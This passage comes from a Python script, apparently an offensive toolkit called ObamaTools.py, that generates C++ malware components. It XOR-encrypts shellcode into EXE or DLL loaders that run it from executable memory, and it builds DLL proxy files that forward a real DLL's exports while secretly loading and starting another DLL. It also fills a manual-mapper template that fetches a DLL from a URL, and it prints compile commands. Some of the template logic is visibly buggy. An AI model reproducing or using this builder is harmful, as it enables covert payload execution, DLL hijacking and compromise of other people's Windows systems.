            << " Protect=0x" << mbi.Protect << std::dec << "\\n";
    }

    // Execute
    bool useThread = true;
    std::cout << "Calling payload at " << exec << " useThread=" << useThread << "\\n";

    DWORD tid;
    if (useThread) {
        HANDLE th = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec, nullptr, 0, &tid);
        if (!th) {
            std::cerr << "CreateThread failed: " << GetLastError() << "\\n";
        } else {
            WaitForSingleObject(th, INFINITE);
            CloseHandle(th);
        }
    } else {
        typedef void(*fn)();
        fn f = (fn)exec;
        __try { f(); }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            std::cerr << "SEH: exception code 0x" << std::hex << GetExceptionCode() << std::dec << "\\n";
        }
    }

    // Cleanup
    VirtualFree(exec, 0, MEM_RELEASE);
    std::cerr << "Memory freed\\n";

    RemoveVectoredExceptionHandler(vh);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModuleCall,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
"""

newCallTempl = """
        {
            char dllPath[MAX_PATH];
            ExpandEnvironmentStringsA(
                "PATH_TO_DLL",
                dllPath,
                MAX_PATH
            );

            HMODULE hDll = LoadLibraryA(dllPath);
            FARPROC p = GetProcAddress(hDll, "MAIN_FUNC_NAME");

            HANDLE hThread = StartSafeThread<int>(p, ARGS_PLACEHOLDER);
            //DO NOT WAIT
        }
//additional dll loadings"""

cppScript = """
#include <cstring>
#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <windows.h>
#include <string>
#include <vector>
#include <tuple>
#include <utility>
#include <iostream>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

PRAGMA_COMMENTS

HMODULE hReal = nullptr;

// 1 SafeCall template
template<typename R, typename... Args>
R SafeCall(void* fn, Args&&... args) {
    using Fn = R(WINAPI*)(Args...);
    return ((Fn)fn)(std::forward<Args>(args)...);
}

// 2 Thread task
template<typename R, typename... Args>
struct ThreadTask {
    void* fn;             // raw function pointer
    std::tuple<Args...> args; // stored arguments
    R result;

    ThreadTask(void* f, Args&&... a)
        : fn(f), args(std::forward<Args>(a)...) {}
};

// 3 Thread procedure
template<typename R, typename... Args>
DWORD WINAPI ThreadProc(LPVOID param) {
    auto* task = static_cast<ThreadTask<R, Args...>*>(param);
    __try {
        task->result = std::apply([&](auto&&... unpackedArgs) {
            return SafeCall<R>(task->fn, std::forward<decltype(unpackedArgs)>(unpackedArgs)...);
        }, task->args);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        task->result = R{}; // default value on exception
    }
    delete task;
    return 0;
}

// 4 Helper to start the thread
template<typename R, typename... Args>
HANDLE StartSafeThread(void* fn, Args&&... args) {
    auto* task = new ThreadTask<R, Args...>(fn, std::forward<Args>(args)...);
    HANDLE hThread = CreateThread(
        nullptr, 0,
        ThreadProc<R, Args...>,
        task,
        0, nullptr
    );
    return hThread;
}

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
    if (!hReal) {
        hReal = LoadLibraryExW(L"DLLBASENAME", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
    }

    if (hReal) {
        using DllMainFn = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
        DllMainFn orig = (DllMainFn)GetProcAddress(hReal, "DllMain");
        if (!orig) {
            orig = (DllMainFn)GetProcAddress(hReal, (LPCSTR)MAKEINTRESOURCEA(180));
        }

        if (orig) {
            orig(hModule, ul_reason_for_call, lpReserved);
        }
    }

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        {
            char dllPath[MAX_PATH];
            ExpandEnvironmentStringsA(
                "PATH_TO_DLL",
                dllPath,
                MAX_PATH
            );

            HMODULE hDll = LoadLibraryA(dllPath);
            FARPROC p = GetProcAddress(hDll, "MAIN_FUNC_NAME");

            HANDLE hThread = StartSafeThread<int>(p, ARGS_PLACEHOLDER);
            //DO NOT WAIT

        }
//additional dll loadings
    }
    break;

    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
"""



#======================================================================================================
# MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':
    # Determine mode and parse args as before, removing any -d/--dll flag
    
    # ... parsing code unchanged but set outputAsDLL True if -d/--dll is in args ...
    
    if createLoader:
        try:
            with open(shellcodepath, "rb") as shellcodeFileHandle:
                shellcodeBytes = bytearray.fromhex(shellcodeFileHandle.read().decode('utf-8').strip("\n").replace('"', '').replace("\\x", " "))
                print("")
                print(f"{Status} Shellcode file [{shellcodepath}] successfully loaded.")
        except IOError:
            print(ErrorSign," Could not open or read file [{}]".format(shellcodepath))
            quit()

        transformedShellcode = xor(shellcodeBytes, masterKey)
        cipherType = 'xor'

    print("\n\033[32m==================================== RESULT ====================================\033[0m\n")

    if createLoader:
        print(f"{Status} Encrypted shellcode size: [{len(transformedShellcode)}] bytes")
        shellcodeFormatted = formatCPP(transformedShellcode, masterKey, cipherType)

    if createProxy:

            # Load the PE file
            dllPeHeaders = pefile.PE(dllPath)
            # Build linker redirect pragmas equivalent (corrected)
            pragmaBuilder = ""

            IMAGE_SCN_MEM_EXECUTE = 0x20000000

            for sym in dllPeHeaders.DIRECTORY_ENTRY_EXPORT.symbols:
                if sym.forwarder is not None:
                    continue
                name = sym.name.decode() if sym.name else None
                ord = sym.ordinal
                rva = sym.address # already an RVA for non-forwarded exports
                section = dllPeHeaders.get_section_by_rva(rva)
                is_data = section is not None and not (section.Characteristics & IMAGE_SCN_MEM_EXECUTE)

                if name and name.startswith("Global_WindowsStorage_"):
                    is_data = True

                if name:
                    if is_data:
                        sys.exit(f"{ErrorSign} Target-Dll exports data.\n{ErrorSign}Please provide a DLL that only exports functions (no data exports)!\n{ErrorSign}Offending export: {name} (ordinal {ord})")
                    else:
                        pragmaBuilder += f'#pragma comment(linker, "/export:{name}={os.path.basename(dllPath)}.{name},@{ord}")\n'
                        print(f"{Success} Exported Funktion {name} (ordinal {ord}).")
                else:
                    if is_data:
                        sys.exit(f"{ErrorSign} Target-Dll exports data.\n{ErrorSign}Please provide a DLL that only exports functions (no data exports)!\n{ErrorSign}Offending export: NONAME (ordinal {ord})")
                    else:
                        pragmaBuilder += f'#pragma comment(linker, "/export:ord{ord}={os.path.basename(dllPath)}.#{ord},@{ord},NONAME")\n'
                        print(f"{Success} Exported Noname Funktion (ordinal {ord}).")
            print(f"{Status} Forwarded {len(dllPeHeaders.DIRECTORY_ENTRY_EXPORT.symbols)} function calls from {finalProxyName} to {os.path.basename(dllPath)}")
            dllTemplate = cppScript.replace("PRAGMA_COMMENTS", pragmaBuilder)
            dllTemplate = dllTemplate.replace("MAIN_FUNC_NAME", mainFuncName)
            dllTemplate = dllTemplate.replace("DLLBASENAME", os.path.basename(dllPath))
            dllTemplate = dllTemplate.replace("PATH_TO_DLL", exepath.replace("\\", "\\\\").replace("/", "\\\\"))

            if len(mainFuncArgs) > 0:
                waitfor = False
                if "__wait__" in mainFuncArgs:
                    mainFuncArgs.remove("__wait__")
                    waitfor = True
                mainFuncArgs = ', '.join(mainFuncArgs)
                dllTemplate = dllTemplate.replace("ARGS_PLACEHOLDER", mainFuncArgs.replace("\\", "\\\\"))
                if waitfor:
                    dllTemplate = dllTemplate.replace("//DO NOT WAIT", "WaitForSingleObject(hThread, INFINITE);")
                    waitfor = False
            
            if len(otherCalls) > 0:
                for i in otherCalls:
                    i = i.split(" ")
                    placeholder = random.randint(0, 999999)
                    name = i[0].replace("/", "\\")
                    dllTemplate = dllTemplate.replace("//additional dll loadings", newCallTempl.replace("MAIN_FUNC_NAME", i[1]).replace("PATH_TO_DLL", name).replace("\\", "\\\\"))
                    if len(i) > 2:
                        args = []
                        for j in range(2, len(i)):
                            a = i[j].strip(" \n\r")
                            if a == "__wait__":
                                waitfor = True
                                continue
                            args.append(a)
                        args = ', '.join(args)
                        dllTemplate = dllTemplate.replace("ARGS_PLACEHOLDER", args.replace("\\", "\\\\"))
                        if waitfor:
                            parts = dllTemplate.rsplit("//DO NOT WAIT", 1)
                            dllTemplate = "WaitForSingleObject(hThread, INFINITE);".join(dllLoaderTemplate)
                            waitfor = False

    # Select C++ loader template based on outputAsDLL flag for shellcode loader
    if createLoader:
        command = "/EHsc"
        if outputAsDLL:
            code = shellCodeLoaderDLL.replace("SHELLCODE_PLACEHOLDER", f"unsigned char enc[] = {shellcodeFormatted};").replace("KEY_PLACEHOLDER", masterKey)
            # write DLL export func loader
            outname = os.path.join(os.path.dirname(cppScriptPath), "ShellCodeLoader-dll.cpp")
            command = "/LD"
        else:
            code = shellCodeLoader.replace("SHELLCODE_PLACEHOLDER", f"unsigned char enc[] = {shellcodeFormatted};").replace("KEY_PLACEHOLDER", masterKey)
            # write EXE loader
            outname = os.path.join(os.path.dirname(cppScriptPath), "ShellCodeLoader-exe.cpp")

        with open(outname, "w", encoding="utf-8") as f:
            f.write(code)
        print(f"{Status} C++ Loader script written to {os.path.abspath(outname)}")
        print(f"{Status} Compile with: cl {command} /std:c++17 \"{outname}\" /link /NOIMPLIB")
    
    if createMapper:
        if not asArgs:
            code = manualMapper.replace("MAINFUNC_NAME", DllMapperFuncName.strip(";()")).replace("INJECTURL1", "".join(DllUrl.replace("https://", "").replace("http://", "").split("/")[:-1])).replace("INJECTURL2", "/" + DllUrl.split("/")[-1])
            outname = "manual_mapper_dll.cpp"
        else:
            code = argsTempl
            outname = "manual_mapper_args_dll.cpp"

        with open(outname, "w", encoding="utf-8") as f:
            f.write(code)
        print(f"{Status} C++ Loader script written to {os.path.abspath(outname)}")
        print(f"{Status} Compile with: cl /LD /std:c++17 \"{outname}\" /link /NOIMPLIB")

    if doBatstarter:
        command = "/EHsc"
        if outputAsDLL:
            code = batstarterDLL
            outname = "start_process_dll.cpp"
            command = "/LD"
            print(f"{Status} Function to call: main_func(const char* file, bool batmode = true, const char* exeArgs = nullptr, waitfor = false);")
        else:
            for line in startingbat.splitlines():
                newline = line.replace("/", "\\").replace("\\","\\\\")
                batstarter = batstarter.replace("//STARTING_BAT", f"start_process(\"{newline}\");\r\n//STARTING_BAT")
            outname = "start_process.cpp"
            code = batstarter
        
        with open(outname, "w", encoding="utf-8") as f:
            f.write(code)
        print(f"{Status} C++ Batstarter script written to {os.path.abspath(outname)}")
        print(f"{Status} Compile with: cl {command} /std:c++17 \"{outname}\" /link /NOIMPLIB")

    if createDllLoader:
        dllLoaderCode = dllLoaderTemplate.replace("DLL_PATH", DllLoaderDllPath.replace("\\", "\\\\"))

        dllLoaderCode = dllLoaderCode.replace("MAIN_FUNC_NAME", DllLoaderFuncName)

        loaderFilePath = "./dll_loader.cpp"
        with open(loaderFilePath, "w", encoding="utf-8") as f:
            f.write(dllLoaderCode)

        print(f"{Status} C++ DLL loader script written to {loaderFilePath}")
        print(f"{Status} Compile with: cl /EHsc /std:c++17 \"{loaderFilePath}\" /link /NOIMPLIB")
        if outputAsDLL:
            # Extend here future for dll output if needed
            pass
    
    if createProxy:
        with open(os.path.join(os.path.dirname("./"), finalProxyName), "w", encoding="utf-8") as f:
            f.write(dllTemplate)
        print(f"{Status} C++ proxy script written to {os.path.abspath(finalProxyName)}\n{Status} Compile with: cl /LD /EHsc /std:c++17 \"{os.path.abspath(finalProxyName)}\" /link user32.lib /NOIMPLIB")

# Original ObamaTools.py fully preserved otherwise.

